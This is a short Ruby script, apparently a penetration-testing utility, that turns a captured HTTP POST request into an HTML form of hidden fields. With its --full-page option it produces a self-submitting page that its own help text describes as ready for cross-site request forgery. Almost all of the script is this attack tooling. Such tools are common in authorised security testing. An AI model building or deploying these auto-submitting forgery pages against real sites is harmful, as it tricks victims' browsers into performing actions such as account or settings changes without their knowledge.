#!/usr/bin/env ruby

##############################################################
#                                                            #
# Written by Patrick Hof <courts@offensivethinking.org>      #
# http://www.offensivethinking.org                           #
#                                                            #
# This software is licensed under the Creative               #
# Commons CC0 1.0 Universal License.                         #
# To view a copy of this license, visit                      #
# http://creativecommons.org/publicdomain/zero/1.0/legalcode #
#                                                            #
##############################################################

# This script takes a POST request from stdin and returns a form with the action
# set to the POST request's URL and hidden form fields for all of the parameters
# in the body.
require 'cgi'
require 'optparse'

options = {
  :delimiter => "\r\n",
  :full => false
}
OptionParser.new do |opts|
  opts.banner = "Usage: #{__FILE__} [options]"

  opts.on("-n", "--newlines", 'Use \n as line delimiter when parsing the POST request instead of \r\n') do |n|
    options[:delimiter] = "\n"
  end
  opts.on("-f", "--full-page", "Print a full HTML page ready for XSRF instead of just the form") do
    options[:full] = true
  end
  opts.on("-h", "--help", "Show this help") do
    puts opts
    exit
  end
end.parse!

# HTML header and footer for a full HTML page with JavaScript for automatic
# submission of the form data. This will trigger the post request as soon as the
# HTML page is fully loaded.
html_header = <<EOF
<html>
  <head>
    <script type="text/javascript">
      function send() {
        if (document.forms[0]) {
          var el = document.getElementById("submitform");
          el.submit();
        }
        else {
          setTimeout("send()", 1000);
        }
      }
    </script>
  </head>
  <body onload="send()">
EOF
html_footer = "   </body>\n</html>"


headers, body = $stdin.read().split(options[:delimiter]*2)
if body
  puts html_header if options[:full]
  url = headers.split("\r\n")[0].split(" ")[1]
  data = CGI.unescape(body.chomp).split("&").map { |x| x.split("=") }
  puts %Q(    <form action="#{url}" id="submitform" method="post">)
  data.each do |i|
    puts %Q(      <input type="hidden" name="#{i[0]}" value="#{i[1]}">)
  end
  puts "    </form>"
  puts html_footer if options[:full]
end
